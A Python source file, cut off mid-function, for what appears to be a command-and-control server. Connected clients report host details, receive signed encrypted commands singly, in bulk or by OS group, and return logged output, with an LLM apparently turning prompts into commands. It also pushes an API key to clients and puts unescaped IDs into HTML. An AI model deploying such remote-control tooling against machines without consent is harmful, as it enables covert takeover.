import socket
import threading
import json
import os
import time
import base64
import uuid
from datetime import datetime
from flask import Flask, render_template
from flask_socketio import SocketIO, emit
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

WEB_HOST = '127.0.0.1'
WEB_PORT = 5000
TCP_HOST = '0.0.0.0'
TCP_PORT = 9000
CLIENTS_DIR = "clients"
CONFIG_FILE = "config.json"
MODEL_CMD_PREFIX = "!MODEL "
SETUP_LLM_PREFIX = "!SETUP_LLM"
MASTER_URL_PREFIX = "!MASTER_URL "
MASTER_MODEL_PREFIX = "!MASTER_MODEL "
CLEAR_MASTER_URL_CMD = "!CLEAR_MASTER_URL"

if not os.path.exists(CLIENTS_DIR):
    os.makedirs(CLIENTS_DIR)

def load_private_key():
    with open("privkey.pem", "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None)

PRIVATE_KEY = load_private_key()

class ClientInfo:
    def __init__(self, client_id="", os="", hostname="", user="", remote_addr="", connected_at=None,
                 available_models=None, current_model=""):
        self.client_id = client_id
        self.os = os
        self.hostname = hostname
        self.user = user
        self.remote_addr = remote_addr
        self.connected_at = connected_at or datetime.now()
        self.available_models = available_models or []
        self.current_model = current_model

    def to_dict(self):
        return {
            "client_id": self.client_id,
            "os": self.os,
            "hostname": self.hostname,
            "user": self.user,
            "remote_addr": self.remote_addr,
            "connected_at": self.connected_at.isoformat(),
            "available_models": self.available_models,
            "current_model": self.current_model
        }

    @classmethod
    def from_dict(cls, data):
        return cls(
            client_id=data["client_id"],
            os=data["os"],
            hostname=data["hostname"],
            user=data["user"],
            remote_addr=data["remote_addr"],
            connected_at=datetime.fromisoformat(data["connected_at"]),
            available_models=data.get("available_models", []),
            current_model=data.get("current_model", "")
        )

class TCPServer:
    def __init__(self, notify_callback, command_output_callback):
        self.notify_callback = notify_callback
        self.command_output_callback = command_output_callback
        self.server_socket = None
        self.running = False
        self.stop_event = threading.Event()
        self.clients = {}
        self.client_ids = []
        self.lock = threading.Lock()
        self.pending_commands = {}
        self.symmetric_keys = {}
        self.master_info = None
        self.master_setup_progress = {}
        self.config = self._load_config()
        self.backend_mode = self.config.get("backend", "ollama")
        self.master_info = self.config.get("master")
        self.groq_config = self.config["groq"]

    def _load_config(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    cfg = json.load(f)
            except:
                cfg = {}
        else:
            cfg = {}
        cfg.setdefault("backend", "ollama")
        cfg.setdefault("master", None)
        cfg.setdefault("groq", {
            "api_key": "",
            "model": "llama-3.3-70b-versatile"
        })
        with open(CONFIG_FILE, 'w') as f:
            json.dump(cfg, f, indent=2)
        return cfg

    def _save_config(self):
        config_to_save = {
            "backend": self.backend_mode,
            "master": self.master_info,
            "groq": self.groq_config
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config_to_save, f, indent=2)

    def _save_command_history(self, client_id, command, output):
        client_folder = os.path.join(CLIENTS_DIR, self._sanitize_filename(client_id))
        if not os.path.exists(client_folder):
            os.makedirs(client_folder)
        history_file = os.path.join(client_folder, "history.json")
        history = []
        if os.path.exists(history_file):
            with open(history_file, 'r', encoding='utf-8') as f:
                try:
                    history = json.load(f)
                except:
                    history = []
        entry = {"timestamp": datetime.now().isoformat()}
        try:
            parsed = json.loads(output)
            if isinstance(parsed, dict) and "prompt" in parsed and "command" in parsed and "output" in parsed:
                entry["prompt"] = parsed["prompt"]
                entry["command"] = parsed["command"]
                entry["output"] = parsed["output"]
            else:
                entry["command"] = command
                entry["output"] = output
        except:
            entry["command"] = command
            entry["output"] = output
        history.append(entry)
        with open(history_file, 'w', encoding='utf-8') as f:
            json.dump(history, f, indent=2)
        self.notify_callback('history_updated', client_id)

    def set_backend_mode(self, mode):
        if mode not in ("ollama", "groq"):
            return
        if mode == self.backend_mode:
            return
        if mode == "groq" and not self.groq_config.get("api_key"):
            self.notify_callback('groq_config_required', {})
            return
        self.backend_mode = mode
        self._save_config()
        self.notify_callback('backend_mode', mode)

        with self.lock:
            client_ids = list(self.client_ids)
        for cid in client_ids:
            if mode == "groq":
                cmd = f"!MODE_GROQ {self.groq_config['api_key']} {self.groq_config['model']}"
            else:
                cmd = "!MODE_OLLAMA"
            self.send_message(cid, cmd)

        if mode == "ollama" and self.master_info:
            self.broadcast_command_to_all(f"{MASTER_URL_PREFIX}{self.master_info['remote_ip']}")
            if 'model' in self.master_info:
                self.broadcast_command_to_all(f"{MASTER_MODEL_PREFIX}{self.master_info['model']}")

    def start(self):
        if self.running:
            return
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((TCP_HOST, TCP_PORT))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)
            self.running = True
            self.stop_event.clear()
            self.notify_callback('backend_mode', self.backend_mode)
            self.notify_callback('server_status', {'running': True, 'port': TCP_PORT})
            self.notify_callback('log', 'TCP server started')
            self.accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            self.accept_thread.start()
        except Exception as e:
            self.notify_callback('log', f'Error starting TCP server: {e}')

    def stop(self):
        if not self.running:
            return
        self.running = False
        self.stop_event.set()
        if self.server_socket:
            self.server_socket.close()
            self.server_socket = None
        with self.lock:
            for client_id, (conn, _) in list(self.clients.items()):
                try:
                    conn.close()
                except:
                    pass
            self.clients.clear()
            self.client_ids.clear()
        self.notify_callback('server_status', {'running': False})
        self.notify_callback('log', 'TCP server stopped')
        self.notify_callback('client_list', get_all_clients_with_status())

    def _accept_connections(self):
        while self.running and not self.stop_event.is_set():
            try:
                conn, addr = self.server_socket.accept()
                self.notify_callback('log', f'New connection from {addr}')
                threading.Thread(target=self._handle_client, args=(conn, addr), daemon=True).start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    self.notify_callback('log', f'Error in accept: {e}')
                break

    def _resolve_client_id(self, suggested_id, os_name, hostname, username):
        def client_file_exists(cid):
            return os.path.exists(os.path.join(CLIENTS_DIR, self._sanitize_filename(cid) + ".json"))

        def load_client_info(cid):
            fpath = os.path.join(CLIENTS_DIR, self._sanitize_filename(cid) + ".json")
            if not os.path.exists(fpath):
                return None
            with open(fpath, 'r', encoding='utf-8') as f:
                data = json.load(f)
            return ClientInfo.from_dict(data)

        if not suggested_id:
            while True:
                new_id = str(uuid.uuid4())
                if not client_file_exists(new_id):
                    return new_id, True
        else:
            if client_file_exists(suggested_id):
                existing = load_client_info(suggested_id)
                if (existing and existing.os == os_name and
                    existing.hostname == hostname and
                    existing.user == username):
                    return suggested_id, False
                else:
                    while True:
                        new_id = str(uuid.uuid4())
                        if not client_file_exists(new_id):
                            return new_id, True
            else:
                while True:
                    new_id = str(uuid.uuid4())
                    if not client_file_exists(new_id):
                        return new_id, True

    def _handle_client(self, conn, addr):
        remote_addr = f"{addr[0]}:{addr[1]}"
        in_system_info = False
        in_models = False
        info = ClientInfo(remote_addr=remote_addr, connected_at=datetime.now())
        suggested_id = ""
        client_id = None
        reader = conn.makefile('r', encoding='utf-8', errors='replace')
        try:
            for line in reader:
                line = line.rstrip('\n')
                if line == "[SYSTEM INFO]":
                    in_system_info = True
                    info = ClientInfo(remote_addr=remote_addr, connected_at=datetime.now())
                    continue
                elif line == "[END SYSTEM INFO]":
                    in_system_info = False
                    continue
                elif line == "[MODELS]":
                    in_models = True
                    info.available_models = []
                    continue
                elif line == "[END MODELS]":
                    in_models = False
                    continue
                elif in_models:
                    if line.strip():
                        info.available_models.append(line.strip())
                    continue
                elif line.startswith("CURRENT_MODEL:"):
                    info.current_model = line[len("CURRENT_MODEL:"):].strip()
                    continue
                elif line.startswith("SESSION_KEY:"):
                    enc_key_b64 = line[len("SESSION_KEY:"):]
                    try:
                        enc_key = base64.b64decode(enc_key_b64)
                        session_key = PRIVATE_KEY.decrypt(enc_key, padding.PKCS1v15())
                    except Exception as e:
                        self.notify_callback('log', f'Failed to decrypt session key: {e}')
                        break

                    final_id, is_new = self._resolve_client_id(suggested_id, info.os, info.hostname, info.user)
                    info.client_id = final_id
                    client_id = final_id
                    with self.lock:
                        if client_id in self.clients:
                            old_conn, _ = self.clients[client_id]
                            try:
                                old_conn.close()
                            except:
                                pass
                            del self.clients[client_id]
                            self.client_ids = [cid for cid in self.client_ids if cid != client_id]
                            self.notify_callback('log', f'Duplicate connection for {client_id}, closing previous')
                        self.clients[client_id] = (conn, info)
                        self.client_ids.append(client_id)
                        self.symmetric_keys[client_id] = session_key
                    conn.sendall(f"ASSIGNED_ID:{final_id}\n".encode('utf-8'))
                    if self.master_info:
                        conn.sendall(f"MASTER:{self.master_info['remote_ip']}\n".encode('utf-8'))
                        if 'model' in self.master_info:
                            conn.sendall(f"MASTER_MODEL:{self.master_info['model']}\n".encode('utf-8'))
                    else:
                        conn.sendall(f"MASTER:none\n".encode('utf-8'))
                    if self.backend_mode == "groq":
                        self.send_message(client_id, f"!MODE_GROQ {self.groq_config['api_key']} {self.groq_config['model']}")
                    else:
                        self.send_message(client_id, "!MODE_OLLAMA")
                    if is_new or not self._client_info_exists(final_id):
                        self._save_client_info(info)
                    else:
                        existing = self._load_client_info(final_id)
                        if existing:
                            info.os = existing.os
                            info.hostname = existing.hostname
                            info.user = existing.user
                        self._save_client_info(info)
                    self.notify_callback('client_added', info.to_dict())
                    self.notify_callback('log', f'Client connected: {client_id} ({remote_addr})')
                    self.notify_callback('log', f'Info: OS={info.os}, Host={info.hostname}, User={info.user}, Models={info.available_models}, Current={info.current_model}')
                    continue

                if in_system_info:
                    if ':' not in line:
                        continue
                    key, value = line.split(':', 1)
                    key = key.strip()
                    value = value.strip()
                    if key == "OS":
                        info.os = value
                    elif key == "Hostname":
                        info.hostname = value
                    elif key == "User":
                        info.user = value
                    elif key == "Client ID":
                        suggested_id = value
                    continue

                if client_id:
                    try:
                        encrypted_response = line.strip()
                        if encrypted_response:
                            payload = base64.b64decode(encrypted_response)
                            nonce = payload[:12]
                            ciphertext_tag = payload[12:]
                            aesgcm = AESGCM(self.symmetric_keys[client_id])
                            decrypted_bytes = aesgcm.decrypt(nonce, ciphertext_tag, None)
                            output = decrypted_bytes.decode('utf-8', errors='replace')

                            try:
                                progress_data = json.loads(output)
                            except:
                                progress_data = None

                            if isinstance(progress_data, dict) and progress_data.get("type") == "master_setup_progress":
                                stage = progress_data.get('stage', '')
                                status = progress_data.get('status', '')
                                message = progress_data.get('message', '')
                                stage_map = {
                                    'start': 0,
                                    'checking_ollama': 10,
                                    'checking_vcredist': 20,
                                    'installing_vcredist': 30,
                                    'installing_ollama': 50,
                                    'checking_models': 60,
                                    'pulling_model': 70,
                                    'configuring_service': 90,
                                    'finished': 100
                                }
                                percent = stage_map.get(stage, 50)
                                self.master_setup_progress[client_id] = {
                                    'stage': stage,
                                    'status': status,
                                    'message': message,
                                    'percent': percent
                                }
                                self.notify_callback('master_setup_progress', {
                                    'client_id': client_id,
                                    'stage': stage,
                                    'status': status,
                                    'message': message
                                })
                                continue
                            if isinstance(progress_data, dict) and progress_data.get("type") == "master_setup_done":
                                self.master_setup_progress.pop(client_id, None)
                                status = progress_data.get('status', '')
                                if status == 'success':
                                    self.master_info = {'client_id': client_id, 'remote_ip': addr[0]}
                                    self._save_config()
                                    self.notify_callback('log', f'LLM Master set to {client_id} ({addr[0]})')
                                    if self.backend_mode == "ollama":
                                        self.broadcast_command_to_all(f"{MASTER_URL_PREFIX}{self.master_info['remote_ip']}", exclude_client=client_id)
                                    self.notify_callback('master_info', self.master_info)
                                else:
                                    self.notify_callback('log', f'LLM Master setup failed for {client_id}')
                                    self.master_info = None
                                    self._save_config()
                                    self.broadcast_command_to_all(CLEAR_MASTER_URL_CMD)
                                    self.notify_callback('master_info', None)
                                continue
                            if isinstance(progress_data, dict) and progress_data.get("type") == "master_info_data":
                                models = progress_data.get("models", [])
                                current_model = progress_data.get("current_model", "")
                                if self.master_info and self.master_info['client_id'] == client_id:
                                    self.master_info['model'] = current_model
                                    self.master_info['available_models'] = models
                                    self._save_config()
                                    with self.lock:
                                        if client_id in self.clients:
                                            self.clients[client_id][1].available_models = models
                                            self.clients[client_id][1].current_model = current_model
                                            self._save_client_info(self.clients[client_id][1])
                                    self.notify_callback('master_info', self.master_info)
                                    self.notify_callback('client_list', get_all_clients_with_status())
                                    if self.backend_mode == "ollama":
                                        self.broadcast_command_to_all(f"{MASTER_URL_PREFIX}{self.master_info['remote_ip']}", exclude_client=client_id)
                                        self.broadcast_command_to_all(f"{MASTER_MODEL_PREFIX}{current_model}", exclude_client=client_id)
                                    self.notify_callback('log', f'LLM Master model: {current_model}')
                                continue
                            if isinstance(progress_data, dict) and progress_data.get("type") == "client_model_sync":
                                models = progress_data.get("models", [])
                                current_model = progress_data.get("current_model", "")
                                with self.lock:
                                    if client_id in self.clients:
                                        info_obj = self.clients[client_id][1]
                                        info_obj.available_models = models
                                        info_obj.current_model = current_model
                                        self._save_client_info(info_obj)
                                self.notify_callback('client_list', get_all_clients_with_status())
                                self.notify_callback('log', f"Client {client_id} model list updated: {models}")
                                continue

                            cmd = self.pending_commands.pop(client_id, "unknown")
                            self.command_output_callback(client_id, cmd, output)
                            self._save_command_history(client_id, cmd, output)
                            if cmd.startswith(MODEL_CMD_PREFIX):
                                try:
                                    result = json.loads(output)
                                    if "Model changed to" in result.get("output", ""):
                                        new_model = result["output"].split("Model changed to ")[-1].strip()
                                        with self.lock:
                                            if client_id in self.clients:
                                                info_obj = self.clients[client_id][1]
                                                info_obj.current_model = new_model
                                                self._save_client_info(info_obj)
                                        if self.master_info and self.master_info['client_id'] == client_id:
                                            self.master_info['model'] = new_model
                                            self._save_config()
                                            if self.backend_mode == "ollama":
                                                self.broadcast_command_to_all(f"{MASTER_MODEL_PREFIX}{new_model}", exclude_client=client_id)
                                            self.notify_callback('master_info', self.master_info)
                                        self.notify_callback('client_list', get_all_clients_with_status())
                                except:
                                    pass
                    except Exception as e:
                        self.notify_callback('log', f'Decryption error from {client_id}: {e}')
        except (ConnectionResetError, BrokenPipeError, UnicodeDecodeError):
            pass
        finally:
            conn.close()
            if client_id:
                with self.lock:
                    if client_id in self.clients and self.clients[client_id][0] is conn:
                        del self.clients[client_id]
                        if client_id in self.client_ids:
                            self.client_ids.remove(client_id)
                        self.symmetric_keys.pop(client_id, None)
                self.master_setup_progress.pop(client_id, None)
                if self.master_info and self.master_info['client_id'] == client_id:
                    self.master_info = None
                    self._save_config()
                    self.broadcast_command_to_all(CLEAR_MASTER_URL_CMD)
                    self.notify_callback('master_info', None)
                    self.notify_callback('log', f'LLM Master {client_id} disconnected, master cleared')
                self.notify_callback('client_removed', client_id)

    def _save_client_info(self, info):
        if not info.client_id:
            return
        filename = self._sanitize_filename(info.client_id) + ".json"
        filepath = os.path.join(CLIENTS_DIR, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(info.to_dict(), f, indent=2)

    def _load_client_info(self, client_id):
        filename = self._sanitize_filename(client_id) + ".json"
        filepath = os.path.join(CLIENTS_DIR, filename)
        if not os.path.exists(filepath):
            return None
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return ClientInfo.from_dict(data)

    def _client_info_exists(self, client_id):
        filename = self._sanitize_filename(client_id) + ".json"
        return os.path.exists(os.path.join(CLIENTS_DIR, filename))

    def _sanitize_filename(self, name):
        invalid_chars = '<>:"/\\|?* '
        for ch in invalid_chars:
            name = name.replace(ch, '_')
        return name

    def send_message(self, client_id, message):
        with self.lock:
            client_data = self.clients.get(client_id)
            key = self.symmetric_keys.get(client_id)
        if not client_data or not key:
            self.notify_callback('log', f'Client {client_id} not found or no key')
            return False
        conn, _ = client_data
        try:
            aesgcm = AESGCM(key)
            nonce = os.urandom(12)
            ciphertext = aesgcm.encrypt(nonce, message.encode('utf-8'), None)
            payload = nonce + ciphertext
            signature = PRIVATE_KEY.sign(payload, padding.PKCS1v15(), hashes.SHA256())
            cmd_json = json.dumps({
                "sig": base64.b64encode(signature).decode('ascii'),
                "cipher": base64.b64encode(payload).decode('ascii')
            })
            conn.sendall((cmd_json + "\n").encode('utf-8'))
            self.notify_callback('log', f'Encrypted prompt sent to {client_id}')
            with self.lock:
                self.pending_commands[client_id] = message
            return True
        except Exception as e:
            self.notify_callback('log', f'Error sending to {client_id}: {e}')
            return False

    def broadcast_command_to_all(self, command, exclude_client=None):
        with self.lock:
            client_ids = list(self.client_ids)
        for cid in client_ids:
            if cid == exclude_client:
                continue
            self.send_message(cid, command)

    def get_clients_list(self):
        with self.lock:
            return [self.clients[cid][1].to_dict() for cid in self.client_ids if cid in self.clients]

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins="*")

tcp_server = None

def sanitize_filename(name):
    invalid_chars = '<>:"/\\|?* '
    for ch in invalid_chars:
        name = name.replace(ch, '_')
    return name

def get_all_clients_with_status():
    all_clients = []
    if not os.path.exists(CLIENTS_DIR):
        return all_clients
    for filename in os.listdir(CLIENTS_DIR):
        if filename.endswith('.json') and not filename.startswith('.'):
            filepath = os.path.join(CLIENTS_DIR, filename)
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                client_id = data.get('client_id', filename[:-5])
                connected = False
                if tcp_server and tcp_server.running:
                    with tcp_server.lock:
                        connected = client_id in tcp_server.clients
                safe_id = sanitize_filename(client_id)
                history_file = os.path.join(CLIENTS_DIR, safe_id, "history.json")
                has_history = os.path.exists(history_file)
                client_entry = {
                    "client_id": client_id,
                    "os": data.get("os", "unknown"),
                    "hostname": data.get("hostname", "?"),
                    "user": data.get("user", "?"),
                    "remote_addr": data.get("remote_addr", ""),
                    "connected_at": data.get("connected_at", ""),
                    "status": "connected" if connected else "disconnected",
                    "has_history": has_history,
                    "available_models": data.get("available_models", []),
                    "current_model": data.get("current_model", "")
                }
                if tcp_server and tcp_server.running and client_id in tcp_server.master_setup_progress:
                    client_entry['setup_progress'] = tcp_server.master_setup_progress[client_id]
                all_clients.append(client_entry)
            except:
                continue
    return all_clients

def broadcast_full_client_list():
    socketio.emit('client_list', get_all_clients_with_status())

def notify_web(event, data):
    socketio.emit(event, data)
    if event in ('client_added', 'client_removed', 'server_status', 'history_updated'):
        broadcast_full_client_list()

def command_output_to_web(client_id, command, output):
    display_output = output
    prompt = None
    display_command = command

    try:
        parsed = json.loads(output)
        if isinstance(parsed, dict) and "prompt" in parsed and "command" in parsed and "output" in parsed:
            prompt = parsed["prompt"]
            display_command = parsed["command"]
            display_output = parsed["output"]
    except:
        pass

    socketio.emit('command_output', {
        'client_id': client_id,
        'command': display_command,
        'output': display_output,
        'prompt': prompt
    })

@app.route('/')
def index():
    return render_template('index.html')

def get_os_icon(os_name):
    os_lower = (os_name or '').lower()
    if 'win' in os_lower:
        return 'fab fa-windows'
    elif 'linux' in os_lower:
        return 'fab fa-linux'
    elif 'mac' in os_lower or 'darwin' in os_lower:
        return 'fab fa-apple'
    else:
        return 'fas fa-laptop'

@app.route('/history/<client_id>')
def view_history(client_id):
    safe_id = sanitize_filename(client_id)
    history_file = os.path.join(CLIENTS_DIR, safe_id, "history.json")
    history = []
    if os.path.exists(history_file):
        with open(history_file, 'r', encoding='utf-8') as f:
            history = json.load(f)

    client_info_file = os.path.join(CLIENTS_DIR, safe_id + ".json")
    client_data = {}
    if os.path.exists(client_info_file):
        try:
            with open(client_info_file, 'r', encoding='utf-8') as f:
                client_data = json.load(f)
        except:
            pass

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Command History - {client_id}</title>
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
        <style>
            body {{ background: #0a0f1c; color: #eef; font-family: 'Inter', monospace; padding: 20px; }}
            .header-card {{
                background: rgba(15, 23, 42, 0.74);
                border: 1px solid rgba(255,255,255,0.1);
                border-radius: 28px;
                padding: 20px 24px;
                margin-bottom: 24px;
                backdrop-filter: blur(18px);
                display: flex;
                align-items: center;
                gap: 24px;
                flex-wrap: wrap;
            }}
            .client-icon {{
                font-size: 3rem;
                background: linear-gradient(135deg, #4f7cff, #a56bff);
                width: 70px;
                height: 70px;
                border-radius: 35px;
                display: flex;
                align-items: center;
                justify-content: center;
            }}
            .client-details {{
                flex: 1;
            }}
            .detail-row {{
                display: flex;
                gap: 24px;
                flex-wrap: wrap;
                margin-top: 8px;
            }}
            .detail-item {{
                display: flex;
                align-items: center;
                gap: 8px;
                background: rgba(255,255,255,0.05);
                padding: 6px 14px;
                border-radius: 40px;
                font-size: 0.9rem;
            }}
            .detail-item i {{
                color: #6ea8fe;
                width: 18px;
            }}
            h1 {{
                margin: 0 0 4px 0;
                font-size: 1.6rem;
            }}
            .sort-buttons {{
                display: flex;
                gap: 10px;
                padding: 6px;
                background: rgba(255, 255, 255, 0.06);
                border: 1px solid rgba(255, 255, 255, 0.10);
                border-radius: 16px;
                width: fit-content;
                box-shadow: inset 0 1px 0 rgba(255,255,255,0.04);
            }}
            .sort-btn {{
                display: inline-flex;
                align-items: center;
                gap: 8px;
                background: rgba(255,255,255,0.10);
                color: rgba(234, 240, 255, 0.88);
                border: 1px solid rgba(255,255,255,0.14);
                border-radius: 12px;
                padding: 10px 16px;
                cursor: pointer;
                font-weight: 700;
                font-size: 14px;
                transition: all 0.2s ease;
            }}
            .sort-btn i {{
                font-size: 13px;
                opacity: 0.95;
            }}
            .sort-btn:hover {{
                background: rgba(255,255,255,0.16);
                color: #ffffff;
                border-color: rgba(255,255,255,0.24);
                transform: translateY(-1px);
            }}
            .sort-btn.active {{
                background: linear-gradient(135deg, #4f7cff, #3b63d1);
                color: #ffffff;
                border-color: rgba(255,255,255,0.10);
                box-shadow: 0 0 0 2px rgba(79,124,255,0.22), 0 6px 18px rgba(0,0,0,0.28);
            }}
            .sort-btn.active i {{
                opacity: 1;
            }}
            .sort-btn:focus-visible {{
                outline: none;
                box-shadow: 0 0 0 3px rgba(255,255,255,0.16), 0 0 0 6px rgba(79,124,255,0.22);
            }}
            .sort-btn.active::after {{
                content: "";
                width: 8px;
                height: 8px;
                border-radius: 50%;
                background: #ffffff;
                box-shadow: 0 0 8px rgba(255,255,255,0.7);
            }}
            .entry {{
                border-left: 3px solid #4f7cff;
                margin: 20px 0;
                padding: 10px;
                background: rgba(255,255,255,0.05);
                border-radius: 12px;
            }}
            .time {{ color: #aaa; font-size: 0.8em; }}
            .prompt {{
                background: rgba(79, 124, 255, 0.1);
                border-left: 3px solid #6ea8fe;
                padding: 8px 12px;
                margin: 8px 0;
                border-radius: 8px;
                color: #a5c9ff;
                font-style: italic;
            }}
            .cmd {{ color: #ffb84d; font-weight: bold; }}
            .out pre {{
                margin: 8px 0 0 0;
                padding: 10px;
                background: rgba(0,0,0,0.3);
                border-radius: 8px;
                white-space: pre-wrap;
                word-break: break-word;
                font-family: 'SFMono-Regular', Consolas, monospace;
                color: #d0daff;
                overflow-x: auto;
            }}
        </style>
    </head>
    <body>
        <div class="header-card">
            <div class="client-icon">
                <i class="fas fa-laptop-code"></i>
            </div>
            <div class="client-details">
                <h1>Command History</h1>
                <div class="detail-row">
                    <div class="detail-item"><i class="fas fa-user"></i> {client_data.get('user', '?')}</div>
                    <div class="detail-item"><i class="fas fa-server"></i> {client_data.get('hostname', '?')}</div>
                    <div class="detail-item"><i class="fas fa-network-wired"></i> {client_data.get('remote_addr', '?').split(':')[0]}</div>
                    <div class="detail-item"><i class="{get_os_icon(client_data.get('os', ''))}"></i> {client_data.get('os', 'unknown')}</div>
                </div>
            </div>
            <div class="sort-buttons">
                <button class="sort-btn active" id="sort-newest">
                    <i class="fa-solid fa-arrow-down-wide-short"></i>
                    Newest first
                </button>
                <button class="sort-btn" id="sort-oldest">
                    <i class="fa-solid fa-arrow-up-wide-short"></i>
                    Oldest first
                </button>
            </div>
        </div>
        <div id="history-container"></div>
        <script>
            const clientId = "{client_id}";
            const socket = io();
            const container = document.getElementById('history-container');
            let historyData = [];
            let sortOrder = 'newest';

            function formatTimestamp(isoString) {{
                const date = new Date(isoString);
                const year = date.getFullYear();
                const month = String(date.getMonth() + 1).padStart(2, '0');
                const day = String(date.getDate()).padStart(2, '0');
                const hours = String(date.getHours()).padStart(2, '0');
                const minutes = String(date.getMinutes()).padStart(2, '0');
                const seconds = String(date.getSeconds()).padStart(2, '0');
                return `${{year}}-${{month}}-${{day}} ${{hours}}:${{minutes}}:${{seconds}}`;
            }}

            function escapeHtml(str) {{
                return str.replace(/[&<>]/g, function(m) {{
                    if (m === '&') return '&amp;';
                    if (m === '<') return '&lt;';
                    if (m === '>') return '&gt;';
                    return m;
                }});
            }}

            function renderHistory() {{
                let entries = [...historyData];
                if (sortOrder === 'newest') entries.reverse();
                container.innerHTML = '';
                if (entries.length === 0) {{
                    container.innerHTML = '<div class="entry">No commands executed yet</div>';
                }} else {{
                    entries.forEach(entry => {{
                        const div = document.createElement('div');
                        div.className = 'entry';
                        const formattedTime = formatTimestamp(entry.timestamp);
                        let html = `<div class="time">${{formattedTime}}</div>`;
                        if (entry.prompt !== undefined) {{
                            html += `<div class="prompt"><i class="fa-regular fa-message"></i> ${{escapeHtml(entry.prompt)}}</div>`;
                            html += `<div class="cmd"><i class="fa-solid fa-terminal"></i> ${{escapeHtml(entry.command)}}</div>`;
                        }} else {{
                            html += `<div class="cmd"><i class="fa-solid fa-terminal"></i> ${{escapeHtml(entry.command)}}</div>`;
                        }}
                        html += `<div class="out"><pre>${{escapeHtml(entry.output)}}</pre></div>`;
                        div.innerHTML = html;
                        container.appendChild(div);
                    }});
                }}
            }}

            function addEntry(entry, prepend = false) {{
                if (prepend) {{
                    historyData.unshift(entry);
                }} else {{
                    historyData.push(entry);
                }}
                renderHistory();
            }}

            fetch(`/api/history/${{encodeURIComponent(clientId)}}`)
                .then(res => res.json())
                .then(data => {{
                    historyData = data;
                    updateSortButtons();
                    renderHistory();
                }});

            socket.on('command_output', (data) => {{
                if (data.client_id === clientId) {{
                    const newEntry = {{
                        timestamp: new Date().toISOString(),
                        command: data.command,
                        output: data.output,
                        prompt: data.prompt
                    }};
                    addEntry(newEntry);
                }}
            }});

            const newestBtn = document.getElementById('sort-newest');
            const oldestBtn = document.getElementById('sort-oldest');

            function updateSortButtons() {{
                newestBtn.classList.toggle('active', sortOrder === 'newest');
                oldestBtn.classList.toggle('active', sortOrder === 'oldest');
            }}

            document.getElementById('sort-newest').addEventListener('click', () => {{
                sortOrder = 'newest';
                updateSortButtons();
                renderHistory();
            }});
            document.getElementById('sort-oldest').addEventListener('click', () => {{
                sortOrder = 'oldest';
                updateSortButtons();
                renderHistory();
            }});
        </script>
    </body>
    </html>
    """
    return html

@app.route('/api/history/<client_id>')
def api_history(client_id):
    safe_id = sanitize_filename(client_id)
    history_file = os.path.join(CLIENTS_DIR, safe_id, "history.json")
    if not os.path.exists(history_file):
        return []
    with open(history_file, 'r', encoding='utf-8') as f:
        return json.load(f)
    
def load_server_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                cfg = json.load(f)
        except:
            cfg = {}
    else:
        cfg = {}
    cfg.setdefault("backend", "ollama")
    cfg.setdefault("master", None)
    cfg.setdefault("groq", {
        "api_key": "",
        "model": "llama-3.3-70b-versatile"
    })
    return cfg

@socketio.on('connect')
def handle_connect():
    if tcp_server:
        backend = tcp_server.backend_mode
        socketio.emit('server_status', {'running': tcp_server.running, 'port': TCP_PORT})
        if tcp_server.master_info:
            socketio.emit('master_info', tcp_server.master_info)
    else:
        backend = load_server_config().get("backend", "ollama")
        socketio.emit('server_status', {'running': False})
    socketio.emit('backend_mode', backend)
    broadcast_full_client_list()

@socketio.on('get_clients')
def handle_get_clients():
    broadcast_full_client_list()

@socketio.on('start_server')
def handle_start_server():
    global tcp_server
    if tcp_server is None:
        tcp_server = TCPServer(notify_callback=notify_web, command_output_callback=command_output_to_web)
    if not tcp_server.running:
        tcp_server.start()
        broadcast_full_client_list()
    else:
        notify_web('log', 'TCP server already running')

@socketio.on('stop_server')
def handle_stop_server():
    if tcp_server and tcp_server.running:
        tcp_server.stop()
        broadcast_full_client_list()

@socketio.on('send_message')
def handle_send_message(data):
    client_id = data.get('client_id')
    message = data.get('message')
    if tcp_server and tcp_server.running and client_id and message:
        tcp_server.send_message(client_id, message)

@socketio.on('send_to_all')
def handle_send_to_all(data):
    message = data.get('message')
    if tcp_server and tcp_server.running and message:
        connected_clients = [c['client_id'] for c in get_all_clients_with_status() if c['status'] == 'connected']
        for client_id in connected_clients:
            tcp_server.send_message(client_id, message)

@socketio.on('send_to_group')
def handle_send_to_group(data):
    group = data.get('group')
    message = data.get('message')
    if not tcp_server or not tcp_server.running or not message:
        return
    clients = get_all_clients_with_status()
    for c in clients:
        if c['status'] != 'connected':
            continue
        os_lower = c['os'].lower()
        if group == 'windows' and 'win' in os_lower:
            tcp_server.send_message(c['client_id'], message)
        elif group == 'linux' and 'linux' in os_lower:
            tcp_server.send_message(c['client_id'], message)

@socketio.on('change_model')
def handle_change_model(data):
    client_id = data.get('client_id')
    new_model = data.get('model')
    if not tcp_server or not tcp_server.running or not client_id or not new_model:
        return
    command = f"{MODEL_CMD_PREFIX}{new_model}"
    tcp_server.send_message(client_id, command)

@socketio.on('select_master')
def handle_select_master(data):
    client_id = data.get('client_id')
    if not tcp_server or not tcp_server.running or not client_id:
        return
    if tcp_server.master_info and tcp_server.master_info.get('client_id') != client_id:
        old_master = tcp_server.master_info['client_id']
